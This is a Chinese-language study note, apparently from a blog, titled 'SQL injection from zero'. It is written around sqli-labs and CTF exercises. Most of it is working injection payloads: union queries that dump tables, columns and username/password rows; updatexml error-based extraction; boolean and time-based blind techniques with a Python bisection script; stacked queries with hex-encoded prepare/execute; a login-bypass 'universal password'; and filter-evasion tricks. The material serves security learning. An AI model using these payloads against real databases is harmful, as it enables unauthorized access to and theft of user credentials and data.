---
title: sql注入
date: 2023.3.25
updated: 2023.3.25
categories: 网络安全 
tags: web安全
description: 从0开始的sql注入
---
# **从0开始的sql注入**
## burpsuite fuzz
* Fuzz testing是生成大量数据并且对系统产生大量异常请求，通过大量恶意请求查找漏洞。在这个过程中我们可以依赖于部分工具来实现参数化，本文以burpsuite为工具以文件上传为例,可用此爆破过滤的关键字
* 遇到的问题：
在爆破时遇到报错：Too Many Reqests!
将线程数改为1，时间间隔改小一点
## 查询所有数据：
```
?id=1 or 1=1
```
## 常用语句
* 常用函数：
```
database()	//查询数据库
user()		//当前数据库用户名
version()	//MySQL 版本
```
* 爆表
```
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```
* 爆字段名
```
?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
```
* 相应字段内容
```
?id=-1' union select 1,2,group_concat(id,':',username,':',password) from users --+
```

## 1.sql基本语法
### 1.1 sql select

```sql
select column1,column2 from table_name;     //从表中选取列
select * from table_name;       //从表中选取所有列
```
*column：(列)字段名*

### 1.2 where子句
* WHERE 子句用于提取那些满足指定条件的记录。
---
```sql
select * from websites where coutry = 'CN';
```
*字符要用单引号括起来，数字不用*

### 1.3 AND & OR运算符

|    |                       |
|----|----------------------|
|and |显示两个条件都成立的记录|
|or |两个条件只要有一个成立，就显示其记录|

### 1.4 order by
* ORDER BY 关键字用于对结果集进行排序。
```sql
SELECT column1, column2 FROM table_name ORDER BY column1, column2, ... ASC|DESC;
```
**column1,column2**:要排序的字段名
**ASC**：表示按升序排序。
**DESC**：表示按降序排序。
*默认为升序*

## 2. mysql知识点
|||
|---|---|
|union select|联合查询，判断哪些地方可被替代，并在网页上显示出来|
|database()|回显当前数据库|
|version()|查看当前竖起来版本|
|group_concat()|把产生的同一分组中的值用,连接，形成一个字符串|
|information_schema|存了很多mysql信息的数据库|
### 联合查询：
当联合查询的数据不存在时就会创造一个虚拟数据，如：

![7e5d981f76a54e22b2ce3b6a13287b46](C:\Users\dell\Desktop\笔记\7e5d981f76a54e22b2ce3b6a13287b46.png)
若后端查询语句是先通过查询用户名再进行密码的判断，就可以生成一个虚拟的密码，然后就可以通过查询的虚拟数据生成的密码来登录
* 通常密码被md5加密，可传入md5加密后的密码

**%23可以代替#**
---
**information_schema.schemata**        information_schema库的一个表,名为schemata,存储数据库名的
* **schema_name**:schemata表中存储mysql所有数据库名字的字段
---
**information_schema.tables** 存了mysql所有的表名
* TABLE_SCHEMA表示表所属的数据库名称；
* TABLE_NAME表示所属的表的名称
---
**information_schema.columns**  表存了所有的列的信息   
* COLUMN_NAME表示字段名,当你知道一个表的名字时，可通过此字段获得表中的所有字段名(列名)
---
* 关于and 1=2  **用来判断是数字型注入还是字符型注入**
`若在GET请求中?id=1 and 1=1和?id=1 and 1=2都没有报错，则是字符型注入。`
`若id=1 and 1=1没有报错，但是?id=1 and 1=2有异常或没回显，则是数字型注入。`

## 3.搜索型注入
```
select from 表名 where username like ' %k% ';

```
* 构造闭合：%'
## 4.insert注入
* 语句：
```
insert into member(username,pw,sex,phonenum,email,address) values('必填字段','必填字段','xx','xx','xx','xx','xx',)
```
* playload:
```
 bob' or updatexml(1,concat(0x7e,database()),0) or '
```
## 5.盲注
### 3.1报错注入
* delete/update/insert
* 使用条件：页面有数据库的报错信息
* 判断是否报错
```
?id=1' -- a
```
#### 相关知识：
* **updatexml**
updatexml(xml_doument,XPath_string,new_value)
第一个参数：XML的内容
第二个参数：是需要update的位置XPATH路径
第三个参数：是更新后的内容
所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式
* 0x7e 为符号'~'，因为不符合xpath语法，因此会报错，并把校验失败的东西爆出来。

---
* 一些名词
`column_name:列的名称`
`Information_schema.columns:表示所有的列的信息`
`Information_schema:表示所有信息，包括库、表、列`
`Information_schema.tables:表示所有的表的信息`
`table_schema:数据库的名称`
`table_name:表的名称`
---

* **注入方式：**
* 查库
```sql
?id=1 union select updataxml(1,concat(0x7e,database(),0x7e),1)
```
* 查表
```sql
?id=1 union select updatexml(1,concat(0x7e,(select (group_concat(table_name)) from information_schema.tables where table_schema=database()),0x7e),1)
```
* 查列名
```sql
id=1 union select updatexml(1,concat(0x7e,(select (group_concat(column_name)) from information_schema.columns where table_name='flag'),0x7e),1)
```
* 查flag列内容
```sql
id=1 union select updatexml(1,concat(0x7e,(select (group_concat(flag)) from sqli.flag ),0x7e),1)
```
#### 长度限制
* limit：
```
?id=-1' and updatexml(1,concat(0x7e,(select user from mysql.user limit 1,1)),3) -- a	//limit 0,1为展示第0条数据
```
* substr():
```
?id=-1' and updatexml(1,concat(0x7e,substr((select group_concat(user)
from mysql.user), 1 , 31)),3) -- a
```
### 布尔盲注
* 特征：
1.没有报错信息
2.不管是正确的输入，还是错误的输入,都只显示两种情况(我们可以认为是0或者1)
3.在正确的输入下,输入and 1=1/and 1= 2发现可以判断
4.步骤：
* 用?id=1' and 1=1--+和?id=1' and 1=2--+验证
* 获取长度
* 一个一个猜测flag的内容：
```python
if((ascii(substr((select(flag)from(flag)),1,1))=102),1,0)
```
> if()第一个参数为真，则返回1，假则返回0
> substr(a,1,1)表示从第一个字符开始，截取一个字符

* 其他可用函数：
 left()：
 ```
 left(database(),1)  //前8个字符
 ```
  mid()

* 2分法脚本：

   ascii()参数是布尔值则返回true或false
   
   一下示例为获取数据库名
```python
import requests

url = "http://localhost/sqli-labs-master/Less-8/?id=1'"

def get_dbname():
    db_name = ''
    for i in range(1, 20):
        # 这个遍历是数据库名字的长度如果不够的话就一点一点猜测
        low = 32
        high = 128
        mid = (low + high) // 2
        while (low < high):
            # 32~127是ascii值对应的字符
            payload = "and ascii(substr(database(),%d,1))>%d --+" % (i, mid)
            url1 = url + payload        # 获取url（原url+sql语句构造的url）
            res = requests.get(url1)

            if "You are in..........." in res.text:
                low = mid + 1
            else:
                high = mid
            mid = (low + high) // 2

            if (mid == 32 or mid == 127):
                break
        db_name += chr(mid)
        print("数据库名称为:" + db_name)


get_dbname()
```
#### 没过滤|和单引号'
* playload：用户名是字符串，要用''包起来
```
post:
payload="'||substr(p,{},1)<'{}".format(i,mid)
```

### 时间盲注
* 判断时间盲注：
```
?id=1' and sleep(3) --+
```
## 6.数据不在数据库中
* `知道字段数量为2后，可以查看数据库位置，使用union select 1,2查看未发现数据`
* `修改id=0或id=-1`
* 使用if()语句，若条件正确则有明显延迟

## 7.cookie注入

* 使用burpsuite
* `refer注入：直接在请求中写入**referer:**`   
* `http refer: HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。`    

## 8.堆叠注入
* 使用情况：过滤了select
### 基本语法：
```
1';show databases;#
```
```
1';show tables;#
```
```
1';show columns from words;#		
```
```
1';show columns from `1919810931114514`;#   // (字符串为表名操作时要加反引号)
```
* 输入：
> 1' union select 1,2#
* 发现过滤select，堆叠注入。以下为show函数用法：
> show databases//列出服务器可访问的数据库
> show tables//显示该数据库内相关表的名称
> show columns from tablename；//显示表tablename的字段、字段类型、键值信息、是否可以用null、默认值及其他信息。
* **表名为数字时要用反引号括起来**

### 爆出字段名后
* 将：
```
select * from`1919810931114514`
```
进行16进制编码
* 构造playload：
>;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
---
* prepare…from…是预处理语句，会进行编码转换。
* execute用来执行由SQLPrepare创建的SQL语句。
* SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。
* `将@a赋值为16进制编码后的语句，再将@a中的语句转换后给execsqp，执行execsql中的语句`
---
### handler语句
> handler是mysql的专用语句，没有包含到SQL标准中，但它每次只能查询1次记录，而select可以根据需要返回多条查询结果。
hander `表名` open;           // 打开一个表
handler`表名`read frist;      // 查询第一个数据
handler`表名`read next;     // 查询之后的数据直到最后一个数据返回空
```
handler`1919810931114514` open;handler`1919810931114514`read next;
```
## 9.万能密码:
```sql
username=admin'or'1=1&password=admin'or'1=1
```
`输入账号密码`

```sql
SELECT * FROM t_user WHERE username = 'xxx' AND password = 'xxxx'
```
* 用or 1=1 使where条件恒为true
## 过滤
* 过滤空格,{}：$IFS
* 过滤flag：
* 将关键字replace为空格，使用双写绕过
```
cat$IFS$9`ls` //`ls`可以输出查询结果的内容
```
## 双写绕过：
* playload:(check.php)?username='oorr 1=1%23&password='
`%23为注释，注释掉后面的password，因此password可以随便写;注意先单引号闭合`

## 10.post注入
* 常产生地方：登录框（less-11）
* 数据包提交方式为post
* 此处注释用#或者-- 

## 信息搜集

> 如果我们输入"%\"或者"%1$\",他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么"%\","%1$\"就因为没有经过任何处理而被替换为空。如果%1$ + 非arg格式类型，程序会无法识别占位符类型，变为空

做题时遇到了函数addslashes()，会在单引号前面加/无法用单引号闭合
```
?name=1&pass=%1$' or 1=1--+
```
